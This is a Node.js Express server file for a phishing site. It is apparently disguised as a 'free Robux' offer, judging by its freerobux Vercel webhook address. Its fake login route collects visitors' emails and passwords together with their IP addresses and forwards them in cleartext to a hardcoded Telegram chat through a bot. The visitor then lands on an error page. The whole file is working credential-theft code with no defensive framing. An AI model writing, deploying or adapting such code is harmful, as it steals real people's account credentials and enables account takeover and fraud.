import express from "express";
import session from "express-session";
import bodyParser from "body-parser";
import TelegramBot from 'node-telegram-bot-api';
import 'dotenv/config';
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

const token = process.env.BOT_TOKEN;
const chatId = 7320173655;

function generateMessage(userData) {
    const message = `
    *📝 Data Login User*
    ────────────────────
    *Email:* \`${userData.email}\`
    *Password:* \`${userData.password}\`
    *Login Time:* \`${userData.loginTime}\`
    *IP Address:* \`${userData.ip}\`
    ────────────────────
    `;
    return message;
}

const bot = new TelegramBot(token);
bot.setWebHook(`https://freerobux-five.vercel.app/api/webhook`);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// Session setup
app.use(session({
  secret: "anjayy123mantapbrok",
  resave: false,
  saveUninitialized: true
}));

// Set EJS
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

// Halaman login
app.get("/id/login", (req, res) => {
  if (req.session.user) return res.redirect("/dashboard");
  res.render("login", { error: null });
});

app.get("/", (req, res) => {
    res.render("index", {error: null});
})

// Proses login
app.post("/id/login", (req, res) => {
    const { email, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userData = {
        email: email,
        password: password,
        loginTime: new Date().toLocaleString(),
        ip: ip,
    };
    bot.sendMessage(chatId, generateMessage(userData), { parse_mode: "MarkdownV2" });
    req.session.user = email;
    res.redirect("/dashboard");
});

// Halaman dashboard
app.get("/dashboard", (req, res) => {
  if (!req.session.user) return res.redirect("/id/login");
  res.render("error", { error: null});
});

// Logout
app.get("/logout", (req, res) => {
  req.session.destroy();
  res.redirect("/id/login");
});

// bot
app.post("/api/webhook", (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

export default app;
